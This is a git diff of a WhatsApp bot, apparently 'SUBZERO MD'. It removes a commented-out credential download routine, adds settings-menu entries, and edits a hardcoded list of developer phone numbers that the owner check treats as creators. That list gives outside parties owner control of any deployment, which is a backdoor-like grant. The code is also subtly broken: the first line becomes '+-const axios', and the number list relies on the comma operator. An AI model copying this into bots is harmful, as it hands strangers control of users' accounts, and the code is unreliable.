@@ -1,4 +1,4 @@
-const axios = require('axios')
+-const axios = require('axios')
 const config = require('./config')
 const {
   default: makeWASocket,
@@ -137,68 +137,7 @@ const filer = File.fromURL(`https://mega.nz/file/${megaFileId}`);
     }
 }
 
-//===================SESSION-AUTH============================
-/*const sessionDir = path.join(__dirname, 'sessions');
-const credsPath = path.join(sessionDir, 'creds.json');
-
-// Create session directory if it doesn't exist
-if (!fs.existsSync(sessionDir)) {
-    fs.mkdirSync(sessionDir, { recursive: true });
-}
-
-async function loadSession() {
-    try {
-        if (!config.SESSION_ID) {
-            console.log('No SESSION_ID provided - QR login will be generated');
-            return null;
-        }
-
-        console.log('[⏳] Downloading creds data...');
-
-        // If SESSION_ID starts with "SUBZERO-MD~" - use Koyeb download
-        if (config.SESSION_ID.startsWith('SUBZERO-MD~')) {
-            console.log('[❄️] Downloading session...');
-            const response = await axios.get(`https://subzero-md.koyeb.app/api/downloadCreds.php/${config.SESSION_ID}`, {
-                headers: { 'x-api-key': 'subzero-md' }
-            });
-
-            if (!response.data.credsData) {
-                throw new Error('No credential data received from server');
-            }
-
-            fs.writeFileSync(credsPath, JSON.stringify(response.data.credsData), 'utf8');
-            console.log('✅ Session downloaded successfully');
-            return response.data.credsData;
-        } 
-        // Otherwise try MEGA.nz download
-        else {
-            console.log('[❄️] Downloading MEGA.nz session...');
-            const megaFileId = config.SESSION_ID.startsWith('SUBZERO-MD;;;') 
-                ? config.SESSION_ID.replace("SUBZERO-MD;;;", "") 
-                : config.SESSION_ID;
-
-            const filer = File.fromURL(`https://mega.nz/file/${megaFileId}`);
-            
-            const data = await new Promise((resolve, reject) => {
-                filer.download((err, data) => {
-                    if (err) reject(err);
-                    else resolve(data);
-                });
-            });
-            
-            fs.writeFileSync(credsPath, data);
-            console.log('✅ MEGA session downloaded successfully');
-            return JSON.parse(data.toString());
-        }
-    } catch (error) {
-        console.error('❌ Error loading session:', error.message);
-        console.log('Will generate QR code instead');
-        return null;
-    }
-}
-//=============================================
-*/
-//=============================================
+//=========SESSION-AUTH=====================
 
 
 
@@ -273,10 +212,8 @@ ${mrfrank}\n
                         image: { url: `https://i.postimg.cc/rFTsg8qP/Black-and-Green-Modern-Finance-Business-Report-Presentation.png` }, 
                         caption: upMessage 
                     });
-			// https://i.postimg.cc/Pr77rxj0/Blue-and-White-Simple-Business-Plan-Presentation.png
-			// https://i.postimg.cc/G365KsMt/IMG-20250224-WA0005.jpg
-
-                    // Send settings menu after connection message
+		
+   // Send settings menu after connection message
                     const cmdList = ` ----------------------------------------
     \`\`\`SUBZERO BOT SETTINGS\`\`\`
     -----------------------------------------
@@ -344,12 +281,24 @@ ${mrfrank}\n
 🔧 *15. \`Set Prefix\`*
    - Current Prefix: ${config.PREFIX || "."}
    - Usage: ${config.PREFIX}setprefix <new_prefix>
+   
+ 🤖 *16. \`Set Bot Name\`*
+   - Current Bot Name' ${config.BOT_NAME || "SUBZERO MD"}
+   - Usage: ${config.PREFIX}setbotname <new_name>
+   
+ 🤴 *17. \`Set Owner Name\`*
+   - Current Owner Name: ${config.OWNER_NAME || "DEE"}
+   - Usage: ${config.PREFIX}setownername <owner_name> 
+   
+🖼️ *18. \`Set Bot Image\`*
+   - Current Bot Image: ${config.BOT_IMAGE || "DEFAULT IMAGE"}
+   - Usage: ${config.PREFIX}setbotimage <image_url> / reply to photo
 
-🔄 *16. \`Auto Bio\`*
+🔄 *19. \`Auto Bio\`*
    - Current Status: ${config.AUTO_BIO || "off"}
    - Usage: ${config.PREFIX}autobio on/off [custom text]
 
-🫂 *17. \`SEND WELCOME & GOODBYE MSG\`*
+🫂 *20. \`SEND WELCOME & GOODBYE MSG\`*
    - Current Status: ${config.WELCOME_GOODBYE || "off"}
    - Usage: ${config.PREFIX}welcome on/off 
 
@@ -458,9 +407,12 @@ conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));
   const reply = (teks) => {
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
+  
   const udp = botNumber.split('@')[0];
-    const darex = ('263719647303', '263719064806', '263788236690');
+    const darex = ('263719647303', '263719064805', '263788236690');
+    
     const ownerFilev2 = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));  
+    
     let isCreator = [udp, ...darex, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
     .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') // اطمینان حاصل کنید که شماره‌ها به فرمت صحیح تبدیل شده‌اند
     .includes(mek.sender);
